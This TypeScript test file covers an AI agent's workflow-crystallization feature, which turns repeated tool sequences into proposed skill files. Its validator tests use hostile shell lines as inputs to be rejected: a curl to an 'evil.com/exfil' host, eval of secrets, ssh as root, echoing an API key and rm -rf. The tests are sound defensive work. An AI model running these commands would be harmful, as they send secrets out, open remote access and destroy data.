/**
 * Tests for workflow crystallization — Issue #208.
 * Covers: CrystallizationStore, PatternDetector, SkillCrystallizer,
 *         SkillValidator, CrystallizationProposer, config parsing.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync, existsSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { _testing } from "../index.js";

const {
  CrystallizationStore,
  WorkflowStore,
  PatternDetector,
  SkillCrystallizer,
  SkillValidator,
  CrystallizationProposer,
  computePatternId,
  scorePattern,
  deriveSkillName,
  isExecOnlySequence,
} = _testing as any;

// ---------------------------------------------------------------------------
// Shared fixtures
// ---------------------------------------------------------------------------

let tmpDir: string;
let wfStore: any;
let cStore: any;

const DEFAULT_CRYSTALLIZATION_CFG = {
  enabled: true,
  minUsageCount: 2,
  minSuccessRate: 0.5,
  autoApprove: false,
  outputDir: "",
  maxCrystallized: 50,
  pruneUnusedDays: 30,
};

function makeTmpOutputDir(): string {
  const dir = join(tmpDir, "skills-out");
  return dir;
}

beforeEach(() => {
  tmpDir = mkdtempSync(join(tmpdir(), "crystallization-test-"));
  wfStore = new WorkflowStore(join(tmpDir, "workflow-traces.db"));
  cStore = new CrystallizationStore(join(tmpDir, "crystallization-proposals.db"));
});

afterEach(() => {
  wfStore.close();
  cStore.close();
  rmSync(tmpDir, { recursive: true, force: true });
});

// ============================================================================
// CrystallizationStore
// ============================================================================

describe("CrystallizationStore.create", () => {
  it("creates a proposal with pending status", () => {
    const p = cStore.create({
      patternId: "abc123",
      skillName: "auto-deploy-server",
      skillContent: "# test",
      patternSnapshot: "{}",
    });
    expect(p.id).toBeDefined();
    expect(p.status).toBe("pending");
    expect(p.skillName).toBe("auto-deploy-server");
    expect(p.patternId).toBe("abc123");
    expect(p.rejectionReason).toBeUndefined();
    expect(p.outputPath).toBeUndefined();
  });
});

describe("CrystallizationStore.getById", () => {
  it("returns null for unknown id", () => {
    expect(cStore.getById("no-such-id")).toBeNull();
  });

  it("returns proposal by id", () => {
    const p = cStore.create({ patternId: "p1", skillName: "s1", skillContent: "# c", patternSnapshot: "{}" });
    const fetched = cStore.getById(p.id);
    expect(fetched?.id).toBe(p.id);
  });
});

describe("CrystallizationStore.getByPatternId", () => {
  it("returns the latest proposal for a pattern", () => {
    cStore.create({ patternId: "pat1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    const p = cStore.getByPatternId("pat1");
    expect(p?.patternId).toBe("pat1");
  });

  it("returns null for unknown pattern", () => {
    expect(cStore.getByPatternId("unknown")).toBeNull();
  });
});

describe("CrystallizationStore.list", () => {
  beforeEach(() => {
    cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    const p2 = cStore.create({ patternId: "p2", skillName: "s2", skillContent: "#c", patternSnapshot: "{}" });
    cStore.approve(p2.id, "/path/skill.md");
  });

  it("lists all proposals", () => {
    expect(cStore.list().length).toBe(2);
  });

  it("filters by pending", () => {
    const pending = cStore.list({ status: "pending" });
    expect(pending.length).toBe(1);
    expect(pending[0].status).toBe("pending");
  });

  it("filters by approved", () => {
    const approved = cStore.list({ status: "approved" });
    expect(approved.length).toBe(1);
    expect(approved[0].status).toBe("approved");
  });

  it("respects limit", () => {
    expect(cStore.list({ limit: 1 }).length).toBe(1);
  });
});

describe("CrystallizationStore.approve", () => {
  it("transitions pending to approved with outputPath", () => {
    const p = cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    const updated = cStore.approve(p.id, "/out/path/SKILL.md");
    expect(updated?.status).toBe("approved");
    expect(updated?.outputPath).toBe("/out/path/SKILL.md");
  });

  it("returns null for non-pending proposal", () => {
    const p = cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    cStore.approve(p.id, "/out");
    expect(cStore.approve(p.id, "/out")).toBeNull();
  });
});

describe("CrystallizationStore.reject", () => {
  it("transitions pending to rejected with reason", () => {
    const p = cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    const updated = cStore.reject(p.id, "Not useful");
    expect(updated?.status).toBe("rejected");
    expect(updated?.rejectionReason).toBe("Not useful");
  });

  it("returns null for non-pending", () => {
    const p = cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    cStore.reject(p.id);
    expect(cStore.reject(p.id)).toBeNull();
  });
});

describe("CrystallizationStore.hasPendingOrApprovedForPattern", () => {
  it("returns false when no proposals exist", () => {
    expect(cStore.hasPendingOrApprovedForPattern("abc")).toBe(false);
  });

  it("returns true for pending proposal", () => {
    cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    expect(cStore.hasPendingOrApprovedForPattern("p1")).toBe(true);
  });

  it("returns false for rejected proposal", () => {
    const p = cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    cStore.reject(p.id);
    expect(cStore.hasPendingOrApprovedForPattern("p1")).toBe(false);
  });
});

describe("CrystallizationStore.count", () => {
  it("counts all proposals", () => {
    expect(cStore.count()).toBe(0);
    cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    expect(cStore.count()).toBe(1);
  });

  it("counts by status", () => {
    const p = cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    cStore.approve(p.id, "/out");
    expect(cStore.count("approved")).toBe(1);
    expect(cStore.count("pending")).toBe(0);
  });
});

describe("CrystallizationStore.close / isOpen", () => {
  it("isOpen before close", () => expect(cStore.isOpen()).toBe(true));

  it("isOpen false after close", () => {
    cStore.close();
    expect(cStore.isOpen()).toBe(false);
    cStore = new CrystallizationStore(join(tmpDir, "cs2.db"));
  });

  it("double-close does not throw", () => {
    cStore.close();
    expect(() => cStore.close()).not.toThrow();
    cStore = new CrystallizationStore(join(tmpDir, "cs3.db"));
  });
});

// ============================================================================
// PatternDetector helpers
// ============================================================================

describe("computePatternId", () => {
  it("returns 16-char hex string", () => {
    const id = computePatternId(["exec", "read"]);
    expect(id).toHaveLength(16);
    expect(id).toMatch(/^[0-9a-f]+$/);
  });

  it("is deterministic", () => {
    const seq = ["exec", "read", "write"];
    expect(computePatternId(seq)).toBe(computePatternId(seq));
  });

  it("differs for different sequences", () => {
    expect(computePatternId(["a"])).not.toBe(computePatternId(["b"]));
  });
});

describe("scorePattern", () => {
  it("is totalCount × successRate", () => {
    const pattern = { totalCount: 10, successRate: 0.8, successCount: 8, failureCount: 2, avgDurationMs: 100, exampleGoals: [], toolSequence: [] };
    expect(scorePattern(pattern)).toBeCloseTo(8);
  });

  it("is 0 for 0 success rate", () => {
    const pattern = { totalCount: 5, successRate: 0, successCount: 0, failureCount: 5, avgDurationMs: 0, exampleGoals: [], toolSequence: [] };
    expect(scorePattern(pattern)).toBe(0);
  });
});

// ============================================================================
// PatternDetector
// ============================================================================

describe("PatternDetector.detect", () => {
  it("returns empty when disabled", () => {
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, enabled: false };
    const detector = new PatternDetector(wfStore, cStore, cfg);
    expect(detector.detect()).toEqual([]);
  });

  it("returns empty when no patterns exist", () => {
    const detector = new PatternDetector(wfStore, cStore, DEFAULT_CRYSTALLIZATION_CFG);
    expect(detector.detect()).toEqual([]);
  });

  it("detects candidates meeting thresholds", () => {
    // Insert 3 successful traces with same pattern
    for (let i = 0; i < 3; i++) {
      wfStore.record({ goal: `deploy app ${i}`, toolSequence: ["exec", "exec", "read"], outcome: "success" });
    }

    const detector = new PatternDetector(wfStore, cStore, DEFAULT_CRYSTALLIZATION_CFG);
    const candidates = detector.detect();
    expect(candidates.length).toBeGreaterThan(0);
    expect(candidates[0].pattern.toolSequence).toEqual(["exec", "exec", "read"]);
  });

  it("filters out patterns below minUsageCount", () => {
    // Only 1 trace — below default threshold of 2
    wfStore.record({ goal: "deploy app", toolSequence: ["exec", "read"], outcome: "success" });

    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, minUsageCount: 5 };
    const detector = new PatternDetector(wfStore, cStore, cfg);
    expect(detector.detect()).toEqual([]);
  });

  it("filters out patterns below minSuccessRate", () => {
    wfStore.record({ goal: "g1", toolSequence: ["exec"], outcome: "failure" });
    wfStore.record({ goal: "g2", toolSequence: ["exec"], outcome: "failure" });
    wfStore.record({ goal: "g3", toolSequence: ["exec"], outcome: "failure" });

    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, minUsageCount: 1, minSuccessRate: 0.8 };
    const detector = new PatternDetector(wfStore, cStore, cfg);
    expect(detector.detect()).toEqual([]);
  });

  it("skips patterns already proposed (pending/approved)", () => {
    for (let i = 0; i < 3; i++) {
      wfStore.record({ goal: `g${i}`, toolSequence: ["read", "write"], outcome: "success" });
    }
    const detector = new PatternDetector(wfStore, cStore, DEFAULT_CRYSTALLIZATION_CFG);
    const candidates = detector.detect();
    expect(candidates.length).toBeGreaterThan(0);

    const patternId = candidates[0].patternId;
    cStore.create({ patternId, skillName: "existing", skillContent: "#c", patternSnapshot: "{}" });

    // Second detect should skip this pattern
    const candidates2 = detector.detect();
    expect(candidates2.some((c: any) => c.patternId === patternId)).toBe(false);
  });

  it("sorts candidates by score descending", () => {
    // High-score pattern: 5 successes
    for (let i = 0; i < 5; i++) {
      wfStore.record({ goal: `high ${i}`, toolSequence: ["exec", "read", "write"], outcome: "success" });
    }
    // Lower-score pattern: 2 successes
    for (let i = 0; i < 2; i++) {
      wfStore.record({ goal: `low ${i}`, toolSequence: ["read"], outcome: "success" });
    }

    const detector = new PatternDetector(wfStore, cStore, DEFAULT_CRYSTALLIZATION_CFG);
    const candidates = detector.detect();
    if (candidates.length >= 2) {
      expect(candidates[0].score).toBeGreaterThanOrEqual(candidates[1].score);
    }
  });
});

// ============================================================================
// SkillCrystallizer helpers
// ============================================================================

describe("deriveSkillName", () => {
  it("creates kebab-case name from example goal", () => {
    const name = deriveSkillName(["deploy the server now"], ["exec"], "abc123");
    expect(name).toContain("deploy");
    expect(name).toMatch(/^auto-[a-z0-9-]+$/);
  });

  it("falls back to tool sequence when no goals", () => {
    const name = deriveSkillName([], ["exec", "read"], "abc123");
    expect(name).toMatch(/^auto-exec-read-abc123$/);
  });

  it("handles special characters in goals", () => {
    const name = deriveSkillName(["Deploy: Server!!! 2.0"], ["exec"], "abc123");
    expect(name).toMatch(/^auto-[a-z0-9-]+$/);
  });
});

describe("isExecOnlySequence", () => {
  it("true for all-exec sequence", () => {
    expect(isExecOnlySequence(["exec", "exec", "exec"])).toBe(true);
  });

  it("false for mixed sequence", () => {
    expect(isExecOnlySequence(["exec", "read"])).toBe(false);
  });

  it("false for empty sequence", () => {
    expect(isExecOnlySequence([])).toBe(false);
  });
});

// ============================================================================
// SkillCrystallizer
// ============================================================================

describe("SkillCrystallizer.crystallize", () => {
  it("generates SKILL.md content with pattern metadata", () => {
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: "/tmp/skills" };
    const crystallizer = new SkillCrystallizer(cfg);
    const pattern = {
      toolSequence: ["exec", "read", "memory_store"],
      totalCount: 5,
      successCount: 4,
      failureCount: 1,
      successRate: 0.8,
      avgDurationMs: 1500,
      exampleGoals: ["Deploy the app", "Run server setup"],
    };
    const result = crystallizer.crystallize({ patternId: "abc123", pattern });

    expect(result.skillContent).toContain("exec");
    expect(result.skillContent).toContain("80%");
    expect(result.skillContent).toContain("abc123");
    expect(result.skillContent).toContain("Deploy the app");
    expect(result.skillName).toBeDefined();
    expect(result.proposedOutputPath).toContain("SKILL.md");
    expect(result.proposedOutputPath).toContain("/tmp/skills");
  });

  it("generates shell script for exec-only patterns", () => {
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: "/tmp/skills" };
    const crystallizer = new SkillCrystallizer(cfg);
    const pattern = {
      toolSequence: ["exec", "exec"],
      totalCount: 3,
      successCount: 3,
      failureCount: 0,
      successRate: 1.0,
      avgDurationMs: 200,
      exampleGoals: ["Run bash script"],
    };
    const result = crystallizer.crystallize({ patternId: "xyz999", pattern });
    expect(result.hasScript).toBe(true);
    expect(result.scriptContent).toContain("#!/usr/bin/env bash");
    expect(result.scriptContent).toContain("xyz999");
  });

  it("does not generate shell script for mixed patterns", () => {
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: "/tmp/skills" };
    const crystallizer = new SkillCrystallizer(cfg);
    const pattern = {
      toolSequence: ["exec", "read"],
      totalCount: 3,
      successCount: 3,
      failureCount: 0,
      successRate: 1.0,
      avgDurationMs: 200,
      exampleGoals: ["Read file"],
    };
    const result = crystallizer.crystallize({ patternId: "mix001", pattern });
    expect(result.hasScript).toBe(false);
    expect(result.scriptContent).toBeUndefined();
  });

  it("expands ~ in outputDir", () => {
    const homeDir = process.env["HOME"] ?? "/root";
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: "~/.openclaw/workspace/skills/auto" };
    const crystallizer = new SkillCrystallizer(cfg);
    const pattern = {
      toolSequence: ["exec"],
      totalCount: 3,
      successCount: 3,
      failureCount: 0,
      successRate: 1.0,
      avgDurationMs: 0,
      exampleGoals: ["test"],
    };
    const result = crystallizer.crystallize({ patternId: "t1", pattern });
    expect(result.proposedOutputPath).toContain(homeDir);
    expect(result.proposedOutputPath).not.toContain("~");
  });
});

// ============================================================================
// SkillValidator
// ============================================================================

describe("SkillValidator", () => {
  let validator: any;
  beforeEach(() => { validator = new SkillValidator(); });

  it("passes valid SKILL.md content", () => {
    const content = `# my-skill\n\nUse when deploying.\n\n## Steps\n\n1. Call exec.\n`;
    expect(validator.validate(content).valid).toBe(true);
  });

  it("denies eval() in code block", () => {
    const content = "# skill\n\n```bash\neval $(cat secrets)\n```\n";
    const result = validator.validate(content);
    expect(result.valid).toBe(false);
    expect(result.violations.some((v: string) => v.includes("eval"))).toBe(true);
  });

  it("denies curl in code block", () => {
    const content = "# skill\n\n```bash\ncurl https://evil.com/exfil\n```\n";
    const result = validator.validate(content);
    expect(result.valid).toBe(false);
    expect(result.violations.some((v: string) => v.includes("curl"))).toBe(true);
  });

  it("denies SSH command with user@host in code block", () => {
    const content = "# skill\n\n```bash\nssh root@192.168.1.1\n```\n";
    const result = validator.validate(content);
    expect(result.valid).toBe(false);
    expect(result.violations.some((v: string) => v.includes("ssh"))).toBe(true);
  });

  it("denies credential env var in code block", () => {
    const content = "# skill\n\n```bash\necho $API_KEY\n```\n";
    const result = validator.validate(content);
    expect(result.valid).toBe(false);
    expect(result.violations.some((v: string) => v.includes("credential"))).toBe(true);
  });

  it("denies command substitution in code block", () => {
    const content = "# skill\n\n```bash\nresult=$(whoami)\n```\n";
    const result = validator.validate(content);
    expect(result.valid).toBe(false);
    expect(result.violations.some((v: string) => v.includes("subst"))).toBe(true);
  });

  it("does not trigger on shell keywords in plain text (non-code-block)", () => {
    const content = "# skill\n\nRun curl to check the endpoint.\n";
    // curl outside code block should not be flagged
    const result = validator.validate(content);
    expect(result.valid).toBe(true);
  });

  it("denies rm -rf absolute path", () => {
    const content = "# skill\n\n```bash\nrm -rf /home/user\n```\n";
    const result = validator.validate(content);
    expect(result.valid).toBe(false);
  });

  it("isValid convenience method", () => {
    expect(validator.isValid("# clean skill\n\nJust text.\n")).toBe(true);
    expect(validator.isValid("# bad\n\n```bash\neval $(bad)\n```\n")).toBe(false);
  });
});

// ============================================================================
// CrystallizationProposer — full lifecycle
// ============================================================================

describe("CrystallizationProposer.runCycle", () => {
  it("returns no candidates when disabled", () => {
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, enabled: false, outputDir: tmpDir };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    const result = proposer.runCycle();
    expect(result.proposed).toBe(0);
    expect(result.reasons).toContain("Crystallization is disabled");
  });

  it("creates proposals for qualifying patterns", () => {
    for (let i = 0; i < 3; i++) {
      wfStore.record({ goal: `deploy app ${i}`, toolSequence: ["exec", "exec", "read"], outcome: "success" });
    }
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: tmpDir };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    const result = proposer.runCycle();
    expect(result.proposed).toBeGreaterThan(0);
    expect(cStore.count("pending")).toBeGreaterThan(0);
  });

  it("does not re-propose already-proposed patterns", () => {
    for (let i = 0; i < 3; i++) {
      wfStore.record({ goal: `g${i}`, toolSequence: ["read", "memory_store"], outcome: "success" });
    }
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: tmpDir };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    proposer.runCycle();
    const firstCount = cStore.count("pending");

    proposer.runCycle();
    expect(cStore.count("pending")).toBe(firstCount);
  });

  it("stops at maxCrystallized approved limit", () => {
    // Pre-fill with approved proposals up to limit
    for (let i = 0; i < 3; i++) {
      const p = cStore.create({ patternId: `pat${i}`, skillName: `s${i}`, skillContent: "#c", patternSnapshot: "{}" });
      cStore.approve(p.id, `/out/s${i}/SKILL.md`);
    }

    for (let i = 0; i < 3; i++) {
      wfStore.record({ goal: `g${i}`, toolSequence: ["exec"], outcome: "success" });
    }

    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, maxCrystallized: 3, outputDir: tmpDir };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    const result = proposer.runCycle();
    expect(result.proposed).toBe(0);
    expect(result.reasons.some((r: string) => r.includes("maxCrystallized"))).toBe(true);
  });

  it("writes skill to disk when autoApprove=true", () => {
    for (let i = 0; i < 3; i++) {
      wfStore.record({ goal: `run tests ${i}`, toolSequence: ["exec", "read"], outcome: "success" });
    }
    const outputDir = join(tmpDir, "auto-out");
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, autoApprove: true, outputDir };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    const result = proposer.runCycle();

    expect(result.proposed).toBeGreaterThan(0);
    // Check that at least one approved proposal has an outputPath with a file
    const approved = cStore.list({ status: "approved" });
    expect(approved.length).toBeGreaterThan(0);
    expect(existsSync(approved[0].outputPath)).toBe(true);
  });
});

describe("CrystallizationProposer.approveProposal", () => {
  it("writes skill and transitions to approved", () => {
    for (let i = 0; i < 3; i++) {
      wfStore.record({ goal: `g${i}`, toolSequence: ["exec", "read"], outcome: "success" });
    }
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: join(tmpDir, "out1") };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    proposer.runCycle();

    const pending = cStore.list({ status: "pending" });
    expect(pending.length).toBeGreaterThan(0);

    const result = proposer.approveProposal(pending[0].id);
    expect(result.success).toBe(true);
    expect(result.outputPath).toBeDefined();
    expect(existsSync(result.outputPath!)).toBe(true);

    const updated = cStore.getById(pending[0].id);
    expect(updated?.status).toBe("approved");
  });

  it("fails for unknown proposal id", () => {
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: tmpDir };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    const result = proposer.approveProposal("nonexistent");
    expect(result.success).toBe(false);
    expect(result.message).toContain("not found");
  });

  it("fails for already-approved proposal", () => {
    const p = cStore.create({ patternId: "p1", skillName: "s1", skillContent: "# safe\n\n", patternSnapshot: "{}" });
    cStore.approve(p.id, "/out");
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: tmpDir };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    const result = proposer.approveProposal(p.id);
    expect(result.success).toBe(false);
    expect(result.message).toContain("not pending");
  });
});

describe("CrystallizationProposer.rejectProposal", () => {
  it("rejects pending proposal with reason", () => {
    const p = cStore.create({ patternId: "p1", skillName: "s1", skillContent: "#c", patternSnapshot: "{}" });
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: tmpDir };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    const result = proposer.rejectProposal(p.id, "Too generic");
    expect(result.success).toBe(true);

    const updated = cStore.getById(p.id);
    expect(updated?.status).toBe("rejected");
    expect(updated?.rejectionReason).toBe("Too generic");
  });

  it("fails for unknown proposal", () => {
    const cfg = { ...DEFAULT_CRYSTALLIZATION_CFG, outputDir: tmpDir };
    const proposer = new CrystallizationProposer(wfStore, cStore, cfg);
    const result = proposer.rejectProposal("no-such-id");
    expect(result.success).toBe(false);
    expect(result.message).toContain("not found");
  });
});

// ============================================================================
// Config parsing
// ============================================================================

describe("parseCrystallizationConfig", () => {
  const BASE_CFG = {
    embedding: { provider: "openai", apiKey: "sk-test-key-12345678", model: "text-embedding-3-small" },
  };

  it("parses crystallization config from HybridMemoryConfig raw object", async () => {
    const { hybridConfigSchema } = await import("../config.js");
    const cfg = hybridConfigSchema.parse({
      ...BASE_CFG,
      crystallization: {
        enabled: true,
        minUsageCount: 10,
        minSuccessRate: 0.8,
        autoApprove: false,
        outputDir: "~/my-skills",
        maxCrystallized: 100,
        pruneUnusedDays: 60,
      },
    });
    expect(cfg.crystallization.enabled).toBe(true);
    expect(cfg.crystallization.minUsageCount).toBe(10);
    expect(cfg.crystallization.minSuccessRate).toBe(0.8);
    expect(cfg.crystallization.autoApprove).toBe(false);
    expect(cfg.crystallization.outputDir).toBe("~/my-skills");
    expect(cfg.crystallization.maxCrystallized).toBe(100);
    expect(cfg.crystallization.pruneUnusedDays).toBe(60);
  });

  it("defaults to disabled with sensible values when omitted", async () => {
    const { hybridConfigSchema } = await import("../config.js");
    const cfg = hybridConfigSchema.parse(BASE_CFG);
    expect(cfg.crystallization.enabled).toBe(false);
    expect(cfg.crystallization.minUsageCount).toBe(5);
    expect(cfg.crystallization.minSuccessRate).toBe(0.7);
    expect(cfg.crystallization.autoApprove).toBe(false);
    expect(cfg.crystallization.outputDir).toBe("~/.openclaw/workspace/skills/auto");
    expect(cfg.crystallization.maxCrystallized).toBe(50);
    expect(cfg.crystallization.pruneUnusedDays).toBe(30);
  });

  it("ignores invalid minSuccessRate outside 0-1 range", async () => {
    const { hybridConfigSchema } = await import("../config.js");
    const cfg = hybridConfigSchema.parse({
      ...BASE_CFG,
      crystallization: { minSuccessRate: 2.5 },
    });
    expect(cfg.crystallization.minSuccessRate).toBe(0.7); // falls back to default
  });
});
